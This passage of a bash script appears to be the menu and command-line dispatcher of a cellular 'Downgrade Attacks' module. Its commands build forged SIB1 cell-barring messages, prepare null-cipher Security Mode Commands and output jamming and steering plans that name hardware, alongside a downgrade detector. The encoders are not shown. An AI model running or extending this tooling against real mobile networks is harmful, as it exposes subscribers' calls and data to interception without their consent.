  [9]  status
  [0]  back

M
        local c
        read -rp "  choice> " c || return 0  # EOF: leave the menu cleanly
        case "$c" in
            1)
                read -rp "  cause (e.g. 15)> " n
                read -rp "  rat (blank for all: 5GMM|EMM|GMM)> " r
                dwn_cmd_reject_cause "$n" "$r" | column -t -s$'\t' 2>/dev/null
                read -rp "  press enter " _ ;;
            2) dwn_cmd_null_table | column -t -s$'\t' 2>/dev/null; read -rp "  press enter " _ ;;
            3)
                read -rp "  algorithm (e.g. NEA0, EEA2, A5/1)> " a
                read -rp "  rat (NR|LTE|UMTS|GSM)> " r
                dwn_cmd_build_smc "$a" "${r:-NR}" | column -t -s$'\t' 2>/dev/null
                read -rp "  press enter " _ ;;
            4)
                read -rp "  capture path (pcap or record TSV)> " f
                dwn_cmd_detect "$f" | column -t -s$'\t' 2>/dev/null
                read -rp "  press enter " _ ;;
            5)
                read -rp "  path (steer-down|jamming-suppress|cs-fallback)> " p
                dwn_cmd_path "$p" | column -t -s$'\t' 2>/dev/null
                read -rp "  press enter " _ ;;
            6) dwn_cmd_plan steer-down        | column -t -s$'\t' 2>/dev/null; read -rp "  press enter " _ ;;
            7) dwn_cmd_plan jamming-suppress  | column -t -s$'\t' 2>/dev/null; read -rp "  press enter " _ ;;
            8) dwn_cmd_plan cs-fallback       | column -t -s$'\t' 2>/dev/null; read -rp "  press enter " _ ;;
            9) dwn_status | column -t -s$'\t' 2>/dev/null; read -rp "  press enter " _ ;;
            0) return ;;
            *) warn "invalid"; sleep 1 ;;
        esac
    done
}

# ── CLI dispatch ────────────────────────────────────────────────────────
dwn_cli_main() {
    local cmd="${1:-}"
    (($# > 0)) && shift
    case "$cmd" in
        --status-tsv)        dwn_cli_status_tsv ;;
        --reject-cause)      dwn_cmd_reject_cause "${1:-}" "${2:-}" ;;
        --null-cipher-table) dwn_cmd_null_table ;;
        --build-security-mode) dwn_cmd_build_smc "${1:-}" "${2:-NR}" ;;
        --build-sib1)        dwn_build_sib1 "${1:-001}" "${2:-01}" "${3:-1}" "${4:-0}" "${5:-barred}" "${6:-notAllowed}" ;;
        --detect)            dwn_cmd_detect "${1:-}" ;;
        --path)              dwn_cmd_path "${1:-}" ;;
        --plan)              dwn_cmd_plan "${1:-}" ;;
        --causes)            dwn_causes ;;
        --selftest)          dwn_selftest ;;
        --menu)              dwn_menu ;;
        *)
            cat >&2 <<EOF
Downgrade Attacks — cross-generation steering and null-cipher exposure

Usage: $0 COMMAND
  --status-tsv                    SDR, table and plan state as TSV
  --reject-cause <n> [RAT]        look up a real reject cause (5GMM|EMM|GMM)
                                  and the cause IE it is carried in
  --null-cipher-table             NEA0/EEA0/UEA0/A5-0 across all generations
  --build-security-mode <alg> [RAT]
                                  the Security Mode Command algorithm octet
  --build-sib1 <mcc> <mnc> <tac> <cellid> [barred|notBarred] [allowed|notAllowed]
                                  a SIB1 body with cellBarred and
                                  intraFreqReselection set — the forged-SIB
                                  suppress-a-RAT vector, encoding half
  --detect <pcap|records.tsv>     find a downgrade: steering reject, RAT
                                  change, or a cipher change to null
  --path <name>                   describe a downgrade mechanism
                                  (steer-down|jamming-suppress|cs-fallback|forged-sib)
  --causes                        the full assigned cause table
  --plan <name>                   write a handoff plan naming the hardware
  --selftest                      verify the tables and encoders without a radio
  --menu                          interactive menu

The record TSV format read by --detect is: ts <TAB> rat <TAB> event <TAB> detail
EOF
            return 2 ;;
    esac
}

if [[ "${BASH_SOURCE[0]}" == "$0" ]]; then
    set -o pipefail
    IMSISTING_CLI=1
    : "${TMP_DIR:=/tmp/imsisting}"
    declare -F banner >/dev/null 2>&1 || banner() { :; }
    declare -F info   >/dev/null 2>&1 || info()   { printf '[info] %s\n' "$*" >&2; }
    declare -F warn   >/dev/null 2>&1 || warn()   { printf '[warn] %s\n' "$*" >&2; }
    declare -F err    >/dev/null 2>&1 || err()    { printf '[err]  %s\n' "$*" >&2; }
    declare -F ok     >/dev/null 2>&1 || ok()     { printf '[ok]   %s\n' "$*" >&2; }
    dwn_cli_main "$@"
fi
